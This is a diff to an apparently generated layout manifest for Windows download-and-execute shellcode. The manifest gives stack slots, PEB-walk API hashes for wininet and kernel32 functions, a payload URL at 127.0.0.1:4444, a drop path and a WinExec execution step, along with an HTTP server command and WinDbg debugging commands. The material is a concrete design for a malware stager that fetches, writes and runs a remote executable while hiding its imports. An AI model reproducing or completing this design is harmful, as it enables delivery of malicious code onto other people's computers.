@@ -6,7 +6,7 @@ Generated from manifest.
 
 # Stack Layout
 
-Frame: `mov ebp, esp` / `sub esp, 0x100` (0x100 bytes reserved)
+Frame: `mov ebp, esp` / `sub esp, 0x200` (0x200 bytes reserved)
 
 ## Export Context (reserved - do not allocate)
 
@@ -33,9 +33,9 @@ Frame: `mov ebp, esp` / `sub esp, 0x100` (0x100 bytes reserved)
 | `[ebp-0x28]` | LoadLibraryA | kernel32.dll |
 | `[ebp-0x2c]` | InternetOpenA | wininet.dll |
 | `[ebp-0x30]` | InternetOpenUrlA | wininet.dll |
-| `[ebp-0x34]` | VirtualAlloc | kernel32.dll |
-| `[ebp-0x38]` | InternetReadFile | wininet.dll |
-| `[ebp-0x3c]` | InternetCloseHandle | wininet.dll |
+| `[ebp-0x34]` | InternetReadFile | wininet.dll |
+| `[ebp-0x38]` | InternetCloseHandle | wininet.dll |
+| `[ebp-0x3c]` | VirtualAlloc | kernel32.dll |
 | `[ebp-0x40]` | CreateFileA | kernel32.dll |
 | `[ebp-0x44]` | WriteFile | kernel32.dll |
 | `[ebp-0x48]` | CloseHandle | kernel32.dll |
@@ -46,14 +46,16 @@ Frame: `mov ebp, esp` / `sub esp, 0x100` (0x100 bytes reserved)
 
 | Offset | Variable | Size |
 |--------|----------|------|
-| `[ebp-0x54]` | bytes_read | 4 |
-| `[ebp-0x58]` | bytes_total | 4 |
-| `[ebp-0x5c]` | inet_session | 4 |
-| `[ebp-0x60]` | inet_url | 4 |
-| `[ebp-0x64]` | virt_buf | 4 |
-| `[ebp-0x68]` | read_ret | 4 |
-| `[ebp-0x6c]` | file_handle | 4 |
-| `[ebp-0x70]` | exec_ret | 4 |
+| `[ebp-0x54]` | bytes_total | 4 |
+| `[ebp-0x58]` | bytes_read | 4 |
+| `[ebp-0x5c]` | buf_ptr | 4 |
+| `[ebp-0x60]` | inet_session | 4 |
+| `[ebp-0x64]` | inet_url | 4 |
+| `[ebp-0x68]` | virt_buf | 4 |
+| `[ebp-0x6c]` | irf_ret | 4 |
+| `[ebp-0x70]` | file_handle | 4 |
+| `[ebp-0x74]` | write_ret | 4 |
+| `[ebp-0x78]` | exec_ret | 4 |
 
 ## Structures
 
@@ -63,9 +65,9 @@ _No structures._
 
 | Offset | Label | Value | Size |
 |--------|-------|-------|------|
-| `[ebp-0x8c]` | user_agent | Mozilla/5.0 | 12 |
-| `[ebp-0xb0]` | url | http://127.0.0.1:4444/payload.exe | 36 |
-| `[ebp-0xbc]` | dst_path | C:\dest.txt | 12 |
+| `[ebp-0x10c]` | user_agent | Mozilla/5.0 | 12 |
+| `[ebp-0x130]` | url | http://127.0.0.1:4444/payload.exe | 36 |
+| `[ebp-0x13c]` | dst_path | C:\dest.txt | 12 |
 
 ---
 
@@ -80,7 +82,7 @@ Resolution: PEB walk
 | API | Hash | Slot | Category |
 |-----|------|------|----------|
 | LoadLibraryA | `0xec0e4e8e` | `[ebp-0x28]` | library |
-| VirtualAlloc | `0x91afca54` | `[ebp-0x34]` | memory |
+| VirtualAlloc | `0x91afca54` | `[ebp-0x3c]` | memory |
 | CreateFileA | `0x7c0017a5` | `[ebp-0x40]` | filesystem |
 | WriteFile | `0xe80a791f` | `[ebp-0x44]` | filesystem |
 | CloseHandle | `0x0ffd97fb` | `[ebp-0x48]` | synchronization |
@@ -108,7 +110,7 @@ HMODULE LoadLibraryA(LPCSTR lpLibFileName)
 
 #### VirtualAlloc
 
-**Slot:** `[ebp-0x34]`
+**Slot:** `[ebp-0x3c]`
 **Hash:** `0x91afca54`
 **Module:** kernel32.dll
 **Category:** memory
@@ -232,8 +234,8 @@ Resolution: `LoadLibraryA("wininet.dll")` -> base stored at `[ebp-0x24]`
 |-----|------|------|----------|
 | InternetOpenA | `0x57e84429` | `[ebp-0x2c]` | internet |
 | InternetOpenUrlA | `0x7e0fed49` | `[ebp-0x30]` | internet |
-| InternetReadFile | `0x5fe34b8b` | `[ebp-0x38]` | internet |
-| InternetCloseHandle | `0xfa9b69c7` | `[ebp-0x3c]` | internet |
+| InternetReadFile | `0x5fe34b8b` | `[ebp-0x34]` | internet |
+| InternetCloseHandle | `0xfa9b69c7` | `[ebp-0x38]` | internet |
 
 ### API Details
 
@@ -282,7 +284,7 @@ HINTERNET InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeade
 
 #### InternetReadFile
 
-**Slot:** `[ebp-0x38]`
+**Slot:** `[ebp-0x34]`
 **Hash:** `0x5fe34b8b`
 **Module:** wininet.dll
 **Category:** internet
@@ -302,7 +304,7 @@ BOOL InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToR
 
 #### InternetCloseHandle
 
-**Slot:** `[ebp-0x3c]`
+**Slot:** `[ebp-0x38]`
 **Hash:** `0xfa9b69c7`
 **Module:** wininet.dll
 **Category:** internet
@@ -331,24 +333,24 @@ BOOL InternetCloseHandle(HINTERNET hInternet)
 
 ## Setup Commands
 
-**Start HTTP server:**
+**Serve file via HTTP:**
 ```
-python3 -m http.server 80 --directory /path/to/payloads
+python3 -m http.server 4444 --bind 127.0.0.1
 ```
 
-**Download URL:**
+**URL fetched:**
 ```
 http://127.0.0.1:4444/payload.exe
 ```
 
-**Writes to:**
+**Written to:**
 ```
 C:\dest.txt
 ```
 
-**Executes after download:**
+**Auto-executed via WinExec after download:**
 ```
-C:\dest.txt
+
 ```
 
 ## Encoding (if needed)
@@ -393,9 +395,9 @@ pointer is stored at its stack slot. Verify with:
 dd ebp-0x28 L1    ; LoadLibraryA
 dd ebp-0x2c L1    ; InternetOpenA
 dd ebp-0x30 L1    ; InternetOpenUrlA
-dd ebp-0x34 L1    ; VirtualAlloc
-dd ebp-0x38 L1    ; InternetReadFile
-dd ebp-0x3c L1    ; InternetCloseHandle
+dd ebp-0x34 L1    ; InternetReadFile
+dd ebp-0x38 L1    ; InternetCloseHandle
+dd ebp-0x3c L1    ; VirtualAlloc
 dd ebp-0x40 L1    ; CreateFileA
 dd ebp-0x44 L1    ; WriteFile
 dd ebp-0x48 L1    ; CloseHandle
@@ -408,15 +410,15 @@ dd ebp-0x50 L1    ; ExitProcess
 ## Inspect Stack Strings
 
 ```
-da ebp-0x8c    ; user_agent
+da ebp-0x10c    ; user_agent
 ```
 
 ```
-da ebp-0xb0    ; url
+da ebp-0x130    ; url
 ```
 
 ```
-da ebp-0xbc    ; dst_path
+da ebp-0x13c    ; dst_path
 ```
 
 ## Breakpoint Strategy
@@ -429,9 +431,9 @@ assembly to pause before each API call. After each call, check
 bp <sc_base>+<offset_of_call_LoadLibraryA>
 bp <sc_base>+<offset_of_call_InternetOpenA>
 bp <sc_base>+<offset_of_call_InternetOpenUrlA>
-bp <sc_base>+<offset_of_call_VirtualAlloc>
 bp <sc_base>+<offset_of_call_InternetReadFile>
 bp <sc_base>+<offset_of_call_InternetCloseHandle>
+bp <sc_base>+<offset_of_call_VirtualAlloc>
 bp <sc_base>+<offset_of_call_CreateFileA>
 bp <sc_base>+<offset_of_call_WriteFile>
 bp <sc_base>+<offset_of_call_CloseHandle>
